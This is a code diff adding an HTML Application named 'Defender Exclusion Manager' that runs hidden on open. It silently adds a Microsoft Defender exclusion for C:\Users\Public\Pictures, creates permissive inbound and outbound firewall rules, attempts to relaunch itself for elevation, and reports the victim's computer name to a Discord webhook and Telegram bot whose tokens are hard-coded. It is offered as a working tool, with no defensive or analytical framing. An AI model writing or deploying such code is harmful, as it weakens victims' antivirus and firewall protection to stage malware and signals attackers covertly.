@@ -1,0 +1,143 @@
+<html>
+<head>
+    <title>Defender Exclusion Manager</title>
+    <HTA:APPLICATION
+        ID="DefenderExclusion"
+        APPLICATIONNAME="Defender Exclusion"
+        WINDOWSTATE="minimize"
+        SHOWINTASKBAR="no"
+        SYSMENU="no"
+        BORDER="none"
+        SINGLEINSTANCE="yes"
+    />
+    <script language="VBScript">
+        Sub Window_OnLoad
+            On Error Resume Next
+
+            Dim shell, fso, psCmd, targetFolder
+            Set shell = CreateObject("WScript.Shell")
+            Set fso = CreateObject("Scripting.FileSystemObject")
+
+            ' The target directory to exclude
+            targetFolder = "C:\Users\Public\Pictures"
+
+            ' Create the folder if it doesn't exist so Defender can exclude it
+            If Not fso.FolderExists(targetFolder) Then
+                fso.CreateFolder targetFolder
+            End If
+
+            ' PowerShell command:
+            ' 1. Defender: check/add/verify path exclusion
+            ' 2. Firewall: recreate named inbound+outbound allow rules
+            ' 3. Exit 0 on success, 1 on failure
+            psCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
+                    """$p = '" & targetFolder & "'; " & _
+                    "$ruleName = 'DefenderExclusion - Public Pictures'; " & _
+                    "if (-not (Get-MpPreference).ExclusionPath.Contains($p)) { " & _
+                    "  Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue " & _
+                    "}; " & _
+                    "Get-NetFirewallRule -DisplayName $ruleName -ErrorAction SilentlyContinue | Remove-NetFirewallRule -ErrorAction SilentlyContinue; " & _
+                    "New-NetFirewallRule -DisplayName $ruleName -Direction Inbound  -Action Allow -Program 'System' -Profile Any -ErrorAction SilentlyContinue | Out-Null; " & _
+                    "New-NetFirewallRule -DisplayName $ruleName -Direction Outbound -Action Allow -Program 'System' -Profile Any -ErrorAction SilentlyContinue | Out-Null; " & _
+                    "$defOk = (Get-MpPreference).ExclusionPath -contains $p; " & _
+                    "$fwOk  = (Get-NetFirewallRule -DisplayName $ruleName -ErrorAction SilentlyContinue | Measure-Object).Count -ge 2; " & _
+                    "if ($defOk -and $fwOk) { exit 0 } else { exit 1 }"""
+
+            ' Execute the command (0 = hidden, True = wait for it to finish)
+            Dim rc
+            rc = shell.Run(psCmd, 0, True)
+
+            ' If rc is 1, it means we failed (likely because we are not Admin)
+            If rc <> 0 Then
+                ' Relaunch THIS hta as Administrator silently
+                shell.Run "cmd.exe /c mshta.exe ""file:///" & Replace(WScript.ScriptFullName, "\", "/") & """ elevated", 0, False
+            Else
+                ' SUCCESS — notify Discord + Telegram
+                SendNotifications targetFolder
+            End If
+
+            window.close
+        End Sub
+
+        Sub SendNotifications(folderPath)
+            On Error Resume Next
+
+            Dim shell, ps
+            Set shell = CreateObject("WScript.Shell")
+
+            Dim discordHook, tgToken, tgChat
+            discordHook = "https://discord.com/api/webhooks/1476565962324050092/mFIgiyJTsAmlZ4bMmDTVIY_VUJOzqlzDbnpVLfmdcyqUxr-tpjxM_hzvr0wbEyAjRWSn"
+            tgToken     = "8306262636:AAHUwFfAr4jpXYbn7zOx4UlOzsjVjQFUAa0"
+            tgChat      = "7617669233"
+
+            ' Build message text once
+            Dim hostName, msgText
+            hostName = shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
+            msgText = "Exclusions applied successfully on " & hostName & " | Folder: " & folderPath
+
+            ' --- Send to Discord (webhook) ---
+            ' JSON body with content + username override
+            Dim discordJson
+            discordJson = "{""content"":""" & EscapeJson(msgText) & """,""username"":""Defender Exclusion""}"
+
+            ' Write JSON to a temp file to avoid quoting hell on the command line
+            Dim tempDiscord
+            tempDiscord = shell.ExpandEnvironmentStrings("%TEMP%") & "\de_discord.json"
+            WriteTextFile tempDiscord, discordJson
+
+            ps = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
+                 """try { " & _
+                 "Invoke-RestMethod -Uri '" & discordHook & "' -Method Post " & _
+                 "-ContentType 'application/json' " & _
+                 "-Body (Get-Content -Raw -LiteralPath '" & tempDiscord & "') | Out-Null " & _
+                 "} catch {}"""
+            shell.Run ps, 0, True
+
+            ' --- Send to Telegram (bot API) ---
+            Dim telegramUrl
+            telegramUrl = "https://api.telegram.org/bot" & tgToken & "/sendMessage"
+
+            Dim tempTg
+            tempTg = shell.ExpandEnvironmentStrings("%TEMP%") & "\de_telegram.json"
+            Dim tgJson
+            tgJson = "{""chat_id"":""" & tgChat & """,""text"":""" & EscapeJson(msgText) & """}"
+            WriteTextFile tempTg, tgJson
+
+            ps = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
+                 """try { " & _
+                 "Invoke-RestMethod -Uri '" & telegramUrl & "' -Method Post " & _
+                 "-ContentType 'application/json' " & _
+                 "-Body (Get-Content -Raw -LiteralPath '" & tempTg & "') | Out-Null " & _
+                 "} catch {}"""
+            shell.Run ps, 0, True
+
+            ' Cleanup temp files
+            On Error Resume Next
+            fso.DeleteFile tempDiscord, True
+            fso.DeleteFile tempTg, True
+        End Sub
+
+        Sub WriteTextFile(path, content)
+            Dim fso, ts
+            Set fso = CreateObject("Scripting.FileSystemObject")
+            Set ts = fso.CreateTextFile(path, True, True) ' overwrite, Unicode-safe
+            ts.Write content
+            ts.Close
+        End Sub
+
+        Function EscapeJson(s)
+            Dim r
+            r = s
+            r = Replace(r, "\", "\\")
+            r = Replace(r, """", "\""")
+            r = Replace(r, vbCrLf, "\n")
+            r = Replace(r, vbCr, "\n")
+            r = Replace(r, vbLf, "\n")
+            r = Replace(r, vbTab, "\t")
+            EscapeJson = r
+        End Function
+    </script>
+</head>
+<body style="background-color: #000;">
+</body>
+</html>
